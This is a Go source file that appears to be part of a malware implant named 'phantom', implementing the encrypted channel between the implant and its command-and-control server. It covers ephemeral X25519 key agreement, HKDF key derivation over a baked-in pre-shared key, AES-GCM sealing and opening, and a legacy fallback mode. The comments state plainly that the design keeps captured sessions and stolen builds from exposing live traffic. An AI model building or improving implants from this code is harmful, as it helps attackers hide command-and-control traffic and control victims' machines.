package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"sync"
)

// Per-session wire crypto.
//
// The PSK baked into the build is an authenticator, not a traffic key: at
// start-up the implant invents an ephemeral X25519 key, agrees a secret with
// the C2's long-lived public key and derives the real key with HKDF over
// (PSK || shared, salt). The public half plus the random salt travel in the
// "X-P" header and are bound in as AEAD additional data, so one captured
// session never opens another and a stolen build does not open live traffic.
//
// With no serverPub compiled in (older C2) it falls back to the legacy v2
// scheme: PSK directly, fixed AAD.

var (
	legacyAAD = []byte("phantom-v2")
	info      = []byte("phantom-v3")

	sessMu  sync.RWMutex
	sessKey []byte // nil -> legacy mode
	sessAAD []byte
	sessHdr string
)

func b64(raw []byte) string { return base64.RawURLEncoding.EncodeToString(raw) }

func unb64(s string) ([]byte, error) { return base64.RawURLEncoding.DecodeString(s) }

// hkdfSHA256 is extract+expand, spelled out to stay on the stdlib floor.
func hkdfSHA256(secret, salt, infoB []byte, n int) []byte {
	mac := hmac.New(sha256.New, salt)
	mac.Write(secret)
	prk := mac.Sum(nil)

	out := make([]byte, 0, n+sha256.Size)
	var prev []byte
	for i := byte(1); len(out) < n; i++ {
		m := hmac.New(sha256.New, prk)
		m.Write(prev)
		m.Write(infoB)
		m.Write([]byte{i})
		prev = m.Sum(nil)
		out = append(out, prev...)
	}
	return out[:n]
}

// initSession negotiates the session key. pubHex is the C2 public key.
func initSession(pubHex string) error {
	if pubHex == "" {
		sessMu.Lock()
		sessKey, sessAAD, sessHdr = nil, legacyAAD, ""
		sessMu.Unlock()
		return nil
	}
	srvRaw, err := hex.DecodeString(pubHex)
	if err != nil || len(srvRaw) != 32 {
		return fmt.Errorf("bad server key")
	}
	srvPub, err := ecdh.X25519().NewPublicKey(srvRaw)
	if err != nil {
		return err
	}
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return err
	}
	shared, err := priv.ECDH(srvPub)
	if err != nil {
		return err
	}
	salt := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		return err
	}

	key := hkdfSHA256(append(append([]byte{}, key...), shared...), salt, info, 32)
	header := b64(priv.PublicKey().Bytes()) + "." + b64(salt)

	sessMu.Lock()
	sessKey, sessAAD, sessHdr = key, salt, header
	sessMu.Unlock()
	return nil
}

func sessionHeader() string {
	sessMu.RLock()
	defer sessMu.RUnlock()
	return sessHdr
}

func seal(plain []byte) []byte {
	sessMu.RLock()
	k, aad := sessKey, sessAAD
	sessMu.RUnlock()
	if k == nil {
		k, aad = key, legacyAAD
	}
	block, _ := aes.NewCipher(k)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	return append(nonce, gcm.Seal(nil, nonce, plain, aad)...)
}

func open(blob []byte) ([]byte, error) {
	sessMu.RLock()
	k, aad := sessKey, sessAAD
	sessMu.RUnlock()
	if k == nil {
		k, aad = key, legacyAAD
	}
	block, _ := aes.NewCipher(k)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(blob) < ns {
		return nil, fmt.Errorf("short")
	}
	return gcm.Open(nil, blob[:ns], blob[ns:], aad)
}
